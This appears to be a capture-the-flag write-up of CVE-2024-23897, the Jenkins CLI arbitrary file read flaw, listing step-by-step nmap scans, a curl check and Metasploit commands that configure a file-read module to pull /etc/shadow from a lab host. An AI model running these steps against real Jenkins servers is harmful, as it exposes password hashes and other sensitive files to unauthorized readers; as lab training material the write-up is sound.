# Vulnerability Exploitation Report: CVE-2024-23897

## Vulnerability Overview
**CVE ID**: CVE-2024-23897  
**CVSS Score**: 9.8 (Critical)  
**Description**: Jenkins, an open-source automation server, contains a vulnerability in its CLI command parser that allows unauthenticated users to read arbitrary system files. This critical flaw enables attackers to access sensitive files on the target system without authentication.

## Objective
Exploit the CVE-2024-23897 vulnerability on a target Jenkins instance to read sensitive system files and retrieve a flag as part of a capture-the-flag (CTF) challenge.

## Target Information
- **Target IP**: 192.168.5.1
- **Target Port**: 8080 (assumed to be the Jenkins service port)
- **Attack Machine IP**: 192.168.0.5
- **Objective**: Retrieve the flag by exploiting the file read vulnerability.

## Exploitation Steps

### Step 1: Network Discovery
Perform a ping scan to identify active hosts in the 192.168.5.0/24 subnet.

```
nmap -sn 192.168.5.0/24
```

### Step 2: Service Enumeration
Enumerate services on the target host (192.168.5.1) to confirm the presence of Jenkins.

```
nmap -sV 192.168.5.1
```

### Step 3: Verify Jenkins Accessibility
Confirm the Jenkins instance is accessible by sending an HTTP request to port 8080.

```
curl 192.168.5.1:8080
```

### Step 4: Launch Metasploit
Start the Metasploit Framework to access exploit modules for Jenkins.

```
msfconsole
```

### Step 5: Search for Jenkins Exploit
Search Metasploit for exploit modules related to Jenkins.

```
search jenkins
```

### Step 6: Select the Exploit Module
Choose the Metasploit module for the Jenkins CLI arbitrary file read vulnerability.

```
use auxiliary/gather/jenkins_cli_ampersand_arbitrary_file_read
```

### Step 7: Review Exploit Details
Display information about the selected module to understand its options and requirements.

```
info
```

### Step 8: Configure the Exploit
Set the target host to the Jenkins instanceâ€™s IP address.

```
set RHOSTS 192.168.5.1
```

### Step 9: Specify File to Read
Set the file path to read the sensitive `/etc/shadow` file, which may contain the flag or lead to it.

```
set FILE_PATH /etc/shadow
```

### Step 10: Execute the Exploit
Run the exploit to read the specified file on the target system.

```
exploit
```

## Final Result
The exploitation was successful, and the flag was retrieved from the target system.
